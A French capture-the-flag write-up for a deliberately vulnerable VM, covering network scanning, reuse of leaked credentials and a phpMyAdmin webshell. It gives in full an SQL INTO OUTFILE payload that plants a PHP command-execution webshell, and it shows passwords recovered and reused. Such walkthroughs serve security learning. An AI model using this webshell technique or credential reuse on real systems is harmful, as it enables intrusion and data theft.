# Solution 1

## Prélude

Après avoir configuré la VM, il nous faut maintenant trouver un moyen de nous y connecter sachant que nous n'avons aucunes informations sur ses utilisateurs, leurs mots de passe. Nous n'avons même pas l'adresse de la VM.

Nous allons donc utiliser un outil appelé `nmap`, qui va venir scanner notre réseau pour trouver les `adresses IP` qui sont connectées ainsi que les `ports` qui sont ouverts sur ces adresses.

Afin de réduire le champs des adresses possibles, nous allons voir dans la configuration de `VirtualBox`. On y voit que notre adresse sera située entre `192.168.56.101` et `192.168.56.254`.

![VirtualBox Network Configuration](/images/vbox_network.png)

On lance donc `nmap` sur cette plage :

```shell
$ nmap 192.168.56.101-254
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-16 13:52 CET
Nmap scan report for 192.168.56.107
Host is up (0.00016s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 154 IP addresses (1 host up) scanned in 2.66 seconds
```

On sait maintenant que l'IP de notre VM est `192.168.56.107` et que plusieurs ports sont ouverts.

Lorsque l'on se rend à l'adresse de notre VM sur un navigateur, voilà ce que l'on obtient :

![Home website](/images/home.png)

## Social Engineering

Nous allons maintenant effectuer un scan avec `dirb` qui va nous permettre d'effectuer une attaque par dictionnaire dans le but de lister les répertoires existants sur le site. Voici les chemins trouvé :

![dirb output](/images/dirb_output.png)

On peut constater 3 pages principales :

- forum
- webmail
- phpmyadmin

L'accès aux pages `webmail` et `phpmyadmin` est verouillé par un mot de passe, nous allons donc chercher des indices sur le forum.

Un des utilisateurs , `lmezard`, semble avoir des problèmes de connection et à partagé un fichier de log d'erreur. Dans ce fichier, il y a un endroit où on se rend compte qu'il a tapé ce qui ressemble à un mot de passe dans un champ username.

```
...
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
...
```

On essaye donc de se connecter au forum avec les identifiants `lmezard:!q\]Ej?*5K5cy*AJ`, ça marche !

Ensuite on va dans son profil où l'on trouve son adresse mail `laurie@borntosec.net`, et comme cette personne n'a pas utilisé de mot de passe différent, on peut se connecter au client mail,

Client mail où l'un des mails a pour objet `DB Access` et contient le mot de passe `root` de `phpmyadmin` :

`root/Fg-'kKXBj87E:aJ$`

## Exploit phpmyadmin

[Linux Hacking Case Studies Part 3: phpMyAdmin](https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/)

Grâce à ce site, nous avons une potentielle porte d'entrée dans la VM via la création d'un `webshell` par le moyen d'une requête `SQL`.

La requête est la suivante :

```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
```

Le webshell sera donc théoriquement accessible à l'adresse `https://IP/phpMyAdmin/cmd.php`. Malheureusement nous n'avons pas les droits requis pour écrire à cette adresse.

Nous reprenons la sortie de `dirb` et tentons d'écrire dans tous les dossier jusqu'à en trouver un qui fonctionne : `forum/templates_c/cmd.php`.

La requête `SQL` est maintenant :

```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
```

Et le webshell est accessible à l'adresse `https://IP/forum/templates_c/cmd.php'`.

![webshell](/images/webshell.png)

On peut voir que nous sommes connecté en tant que `www-data`, voyons maintenant à quels fichiers nous avons accès :

_Pour une meilleure lisibilité, pas de screenshot_

```shell
$ find / -user www-data -print 2>/dev/null
/home
/home/LOOKATME
/home/LOOKATME/password
/proc/1548
/proc/1548/task
/proc/1548/task/1548
...
```

```shell
$ cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

On trouve un fichier `/home/LOOKATME/password` contenant un couple d'identifiants, peut-être pour se connecter à la VM ?

## FTP Fun

Les identifiants précedemment récupéré ne fonctionnant pas en `ssh`, nous essayons de nous connecter via `ftp` avec le logiciel `Filezilla` car nmap nous avait indiqué que le `port 21` était ouvert et permettait une connection `ftp`.

Les identifiants fonctionnent et nous permettent de récupérer deux fichiers : `README` et `fun`.

```shell
$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

et le fichier `fun` qui est compresser.

```shell
$ tar -xvf fun
ft_fun/
ft_fun/C4D03.pcap
ft_fun/GKGEP.pcap
...
ft_fun/G3VJZ.pcap
ft_fun/Y8S1M.pcap

$ cat ft_fun/C4D03.pcap
}void useless() {

//file259%

$ cat ft_fun/GKGEP.pcap
}void useless() {

//file711%
```

On va creer un [script python](/script/fun.py) qui rassembler tout les fichiers en un seul tout en les remettant dans l'ordre. Une fois cela fait on va lancer le fichiers c, ainsi cree et le hasher via `sha-256`. On a fait un [script bash](/script/fun.sh) qui resume toutes ces etapes.
